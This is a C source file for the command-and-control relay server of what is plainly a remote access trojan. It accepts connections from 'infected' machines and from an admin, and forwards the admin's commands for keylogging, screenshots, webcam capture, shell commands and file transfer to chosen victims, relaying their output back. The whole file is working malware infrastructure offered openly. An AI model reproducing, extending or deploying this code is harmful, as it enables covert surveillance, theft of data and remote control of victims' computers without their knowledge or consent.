#include <stdio.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <pthread.h>

#define ADMIN_PORT 27014
#define INFECTED_PORT 27015
#define MAX_CLIENTS 16

#define HEADER_SIZE 10
#define DEFAULT_BUFLEN 256

unsigned char buffer[DEFAULT_BUFLEN];

enum ACTIONS{
	ACTION_KEYLOG,
	ACTION_SCREENSHOT,
	ACTION_CMD,
	ACTION_LIST_HOSTS,
	ACTION_WEBCAM_SCREENSHOT,
	ACTION_FILE
};

void handleInfected(int); /* function prototype */
void error(char *msg)
{
    perror(msg);
    exit(1);
}
void* handleAdmin(void* params);
void* monitorSockets(void* params);

unsigned char admBuffer[256];

// handles to file descriptors ( sockets )
int clients[MAX_CLIENTS];
int clientsConnected = 0;

int adminSocket = 0;

int main(int argc, char *argv[])
{
     for(int i = 0; i < MAX_CLIENTS; i++){
	 clients[i] = 0; 
     }

     int admThrRet;
     pthread_t adminConnectionThread;
     admThrRet = pthread_create(&adminConnectionThread, NULL, handleAdmin, NULL); 

     // init socket to await infected clients
     int sockfd, newsockfd, portno, clilen, pid;
     struct sockaddr_in serv_addr, cli_addr;

     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     bzero((char *) &serv_addr, sizeof(serv_addr));

     portno = INFECTED_PORT;

     serv_addr.sin_family = AF_INET;
     serv_addr.sin_addr.s_addr = INADDR_ANY;
     serv_addr.sin_port = htons(portno);

     bind(sockfd, (struct sockaddr *) &serv_addr,sizeof(serv_addr));

     listen(sockfd,MAX_CLIENTS);
     clilen = sizeof(cli_addr);


     // await clients ( infected computers )
     while (1) {
         newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
	 clients[clientsConnected++] = newsockfd;
	 printf("New client arrived on socket #%i.\n",newsockfd);
         //handleInfected(newsockfd);
     } 
     return 0;
}

int read4BE(unsigned char* ptr){
	int inum = 0;
	inum |= (ptr[0] << 24);
	inum |= (ptr[1] << 16);
	inum |= (ptr[2] << 8);
	inum |= (ptr[3]);
	return inum;
}

void write4BE(unsigned char* ptr, int num){
	ptr[0] |= (num >> 24);
	ptr[1] |= ((num << 8) >> 24);
	ptr[2] |= ((num << 16) >> 24);
	ptr[3] |= ((num << 24) >> 24);
}

// this will be changed to a self-normalising struct (handling disconnects etc)
void listClientsInBuffer(unsigned char * buffer){
	bzero(buffer, 256);
	// zero target, flags, and size
	for(int i = 0; i < HEADER_SIZE; i++){
		buffer[i] = 0;
	}
	buffer[4] = ACTION_LIST_HOSTS; // command
	// for now let's just handle it this way, if 
	// there will be more clients, it will hang
	int size = clientsConnected * 4 + HEADER_SIZE;

	write4BE(buffer,size);
	for(int i = 0; i < clientsConnected; i++){
	     write4BE(&buffer[HEADER_SIZE + i * 4], clients[i]);
	}
}

void forwardToTarget(unsigned char* buffer, int size, int target){
	if(target == 0){
		for(int i = 0; i < clientsConnected; i++){
			int n = write(clients[i], buffer, size);
		}
	}
	else{
		int n = write(target, buffer, size);
	}
}
// IN: 
// buffer - a buffer containing received packet
// readingFrom - the handle to the client that
// sent the first packet
void forwardToAdmin(unsigned char* buffer, int readingFrom, int wroteSoFar){
	int totalSize = read4BE(buffer);
	printf("Forwarding with size:%i\n",totalSize);
	write(adminSocket, buffer, wroteSoFar);
	if(totalSize > DEFAULT_BUFLEN){
		while(wroteSoFar < totalSize){
			int n = read(readingFrom, buffer, DEFAULT_BUFLEN);
			write(adminSocket, buffer, n);	
			wroteSoFar += n;
		}
	}

}

// initializes the admin socket, waits
// for the admin to connect
void initAdminSocket(){

     int sockfd, newsockfd, portno, clilen, pid;
     struct sockaddr_in serv_addr, cli_addr;

     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     bzero((char *) &serv_addr, sizeof(serv_addr));

     portno = ADMIN_PORT;

     serv_addr.sin_family = AF_INET;
     serv_addr.sin_addr.s_addr = INADDR_ANY;
     serv_addr.sin_port = htons(portno);

     bind(sockfd, (struct sockaddr *) &serv_addr,sizeof(serv_addr));

     listen(sockfd,MAX_CLIENTS);
     clilen = sizeof(cli_addr);

     // await admin
     adminSocket = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
}


// buffer has already some data with header
void handleFileForward(char* buff, int readSoFar){
	int size = read4BE(buff);
	int target = read4BE(&buff[6]);
	int writenow;
	write(target, admBuffer, readSoFar);
	
	while(readSoFar < size){
		writenow = (size-readSoFar < DEFAULT_BUFLEN) ? (size-readSoFar) : DEFAULT_BUFLEN;
		int n = read(adminSocket,admBuffer,writenow);
		write(target, admBuffer, n);
		readSoFar += n;
	}
}

// init and
// main loop which handles all the traffic
void* handleAdmin(void* params){
     initAdminSocket();
     int n;
     while(1){
	// the commands are not big, and they are single line, therefore
	// there is no need to read again.
	// just action_file will be handled separately and must be all-forwarded
	n = read(adminSocket,admBuffer,256);
	printf("recvdadm\n");

	// admin disconnected
	if(n == -1){
		handleAdmin(NULL);
	}

	unsigned char flags = admBuffer[5];
	unsigned char command = admBuffer[4];
	int target = read4BE(&admBuffer[6]);
	int size = read4BE(admBuffer);
	printf("command recv:%i\n", (int)command);
	if(command == ACTION_LIST_HOSTS){
	    listClientsInBuffer(admBuffer);
	    int buffsize = read4BE(admBuffer);
            int n = write(adminSocket, admBuffer, buffsize);
	}
	else if(command == ACTION_FILE){
		printf("action!\n");
		handleFileForward(admBuffer, n);
	}
	else{
		forwardToTarget(admBuffer, size, target);
		
		if(!(flags & 0x01) && command != ACTION_FILE){	// there is no non-printing flag
			int n = read(target,buffer, DEFAULT_BUFLEN);
			forwardToAdmin(buffer, target, n);
		}
		else{
			return NULL;
		}
	}
      }
     return NULL;
}